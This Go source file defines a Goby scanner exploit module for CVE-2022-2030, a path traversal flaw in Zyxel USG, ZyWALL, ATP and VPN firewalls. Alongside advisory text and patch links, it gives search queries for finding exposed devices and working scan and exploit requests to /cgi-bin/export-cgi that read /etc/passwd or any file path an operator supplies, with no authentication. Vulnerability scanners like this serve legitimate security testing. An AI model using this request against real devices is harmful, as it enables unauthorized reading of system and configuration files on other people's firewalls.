package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Zyxel Path Traversal Vulnerability (CVE-2022-2030)",
    "Description": "<p>Zyxel USG FLEX is a firewall from China's Zyxel Technology (Zyxel). Offers flexible VPN options (IPsec, SSL or L2TP) to provide flexible and secure remote access for remote work and management.</p><p>A security vulnerability in Zyxel products stems from a directory traversal vulnerability found in some CGI programs caused by improper handling of specific character sequences in URLs, combined with vulnerability cve-2022-0342 that could allow an unauthenticated attacker to access vulnerable Attack some restricted files on the device. The following products and versions are affected: Zyxel USG FLEX 100(W) firmware version 4.50 to 5.30, USG FLEX 200 firmware version 4.50 to 5.30, USG FLEX 500 firmware version 4.50 to 5.30, USG FLEX 700 firmware version 4.50 to 5.30, USG FLEX 50 (W) firmware version 4.16 to 5.30, USG20(W)-VPN firmware version 4.16 to 5.30, ATP series firmware version 4.32 to 5.30, VPN series firmware version 4.30 to 5.30, USG/ZyWALL series firmware version 4.11 to 4.72.</p>",
    "Product": "Zyxel-USG-ZyWALL",
    "Homepage": "https://www.zyxel.com/",
    "DisclosureDate": "2022-07-19",
    "Author": "sharecast",
    "FofaQuery": "body=\"/2FA-access.cgi\" && body=\"zyxel zyxel_style1\"",
    "GobyQuery": "body=\"/2FA-access.cgi\" && body=\"zyxel zyxel_style1\"",
    "Level": "3",
    "Impact": "<p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://www.zyxel.com/support/Zyxel-security-advisory-authenticated-directory-traversal-vulnerabilities-of-firewalls.shtml\">https://www.zyxel.com/support/Zyxel-security-advisory-authenticated-directory-traversal-vulnerabilities-of-firewalls.shtml</a></p>",
    "References": [
        "https://security.humanativaspa.it/useless-path-traversals-in-zyxel-admin-interface-cve-2022-2030/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "path",
            "type": "input",
            "value": "../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/export-cgi?category=dev_info&arg0=../etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "/bin/zysh",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/export-cgi?category=dev_info&arg0={{{path}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "VulType": [
        "Directory Traversal"
    ],
    "CVEIDs": [
        "CVE-2022-2030"
    ],
    "CNNVD": [
        "CNNVD-202207-1613"
    ],
    "CNVD": [],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Zyxel 路径遍历漏洞 (CVE-2022-2030)",
            "Product": "Zyxel-USG-ZyWALL",
            "Description": "<p>Zyxel USG FLEX是中国合勤科技（Zyxel）公司的一款防火墙。提供灵活的 VPN 选项（IPsec、SSL 或 L2TP），为远程工作和管理提供灵活的安全远程访问。</p><p>Zyxel产品存在安全漏洞，该漏洞源于一些CGI程序中发现了由未适当处理URL中的特定字符序列引起的目录穿越漏洞，结合漏洞cve-2022-0342可能允许未经过身份验证的攻击者访问受攻击设备上的一些受限文件。以下产品及版本受到影响：Zyxel USG FLEX 100(W)固件版本4.50至5.30、USG FLEX 200固件版本4.50至5.30、USG FLEX 500固件版本4.50至5.30、USG FLEX 700固件版本4.50至5.30、USG FLEX 50(W)固件版本4.16至5.30、USG20(W)-VPN固件版本4.16至5.30、ATP系列固件版本4.32至5.30、VPN系列固件版本4.30至5.30、USG/ZyWALL系列固件版本4.11至4.72。</p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：</p><p><a href=\"https://www.zyxel.com/support/Zyxel-security-advisory-authenticated-directory-traversal-vulnerabilities-of-firewalls.shtml\">https://www.zyxel.com/support/Zyxel-security-advisory-authenticated-directory-traversal-vulnerabilities-of-firewalls.shtml</a></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\"></span>攻击者可能通过浏览目录结构，访问到某些隐秘文件包括配置文件、日志、源代码等，配合其它漏洞的综合利用，攻击者可以轻易的获取更高的权限。<br></p>",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Zyxel Path Traversal Vulnerability (CVE-2022-2030)",
            "Product": "Zyxel-USG-ZyWALL",
            "Description": "<p>Zyxel USG FLEX is a firewall from China's Zyxel Technology (Zyxel). Offers flexible VPN options (IPsec, SSL or L2TP) to provide flexible and secure remote access for remote work and management.</p><p>A security vulnerability in Zyxel products stems from a directory traversal vulnerability found in some CGI programs caused by improper handling of specific character sequences in URLs, combined with vulnerability cve-2022-0342 that could allow an unauthenticated attacker to access vulnerable Attack some restricted files on the device. The following products and versions are affected: Zyxel USG FLEX 100(W) firmware version 4.50 to 5.30, USG FLEX 200 firmware version 4.50 to 5.30, USG FLEX 500 firmware version 4.50 to 5.30, USG FLEX 700 firmware version 4.50 to 5.30, USG FLEX 50 (W) firmware version 4.16 to 5.30, USG20(W)-VPN firmware version 4.16 to 5.30, ATP series firmware version 4.32 to 5.30, VPN series firmware version 4.30 to 5.30, USG/ZyWALL series firmware version 4.11 to 4.72.</p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://www.zyxel.com/support/Zyxel-security-advisory-authenticated-directory-traversal-vulnerabilities-of-firewalls.shtml\">https://www.zyxel.com/support/Zyxel-security-advisory-authenticated-directory-traversal-vulnerabilities-of-firewalls.shtml</a></p>",
            "Impact": "<p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.<br></p>",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10699"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}